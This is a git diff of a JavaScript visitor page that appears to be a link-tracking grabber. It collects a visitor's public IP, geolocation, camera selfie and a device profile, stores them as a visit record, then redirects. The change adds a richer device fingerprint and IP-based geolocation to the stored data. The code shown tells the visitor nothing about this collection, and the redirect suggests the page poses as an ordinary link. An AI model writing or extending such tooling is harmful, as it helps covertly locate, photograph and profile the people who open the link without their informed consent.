@@ -1,9 +1,9 @@
 import {
-  getDeviceInfo,
   fetchPublicIp,
   requestLocation,
   captureSelfie,
 } from "./collect.js";
+import { collectDeviceProfile } from "./device-profile.js";
 import { fetchRedirectUrl, isSupabaseConfigured } from "./settings.js";
 
 function cfg() {
@@ -34,14 +34,26 @@ function saveVisit(payload) {
 export function initVisitorPage() {
   async function run() {
     const redirectPromise = fetchRedirectUrl();
-    const ipPromise = fetchPublicIp().catch(() => ({ ip: null, source: null }));
+    const ipPromise = fetchPublicIp().catch(() => ({
+      ip: null,
+      source: null,
+      geo: null,
+    }));
     const locationPromise = requestLocation();
+    const devicePromise = collectDeviceProfile();
 
-    const [redirectTarget, ipPayload, locationPayload] = await Promise.all([
-      redirectPromise,
-      ipPromise,
-      locationPromise,
-    ]);
+    const [redirectTarget, ipPayload, locationPayload, deviceInfo] =
+      await Promise.all([
+        redirectPromise,
+        ipPromise,
+        locationPromise,
+        devicePromise,
+      ]);
+
+    if (ipPayload.geo) {
+      deviceInfo.network = deviceInfo.network || {};
+      deviceInfo.network.ipGeo = ipPayload.geo;
+    }
 
     let photoPayload = { granted: false, dataUrl: null };
     try {
@@ -53,7 +65,7 @@ export function initVisitorPage() {
     const payload = {
       ip: ipPayload.ip,
       ip_source: ipPayload.source,
-      device_info: getDeviceInfo(),
+      device_info: deviceInfo,
       location_granted: locationPayload.granted,
       location: locationPayload.granted
         ? {
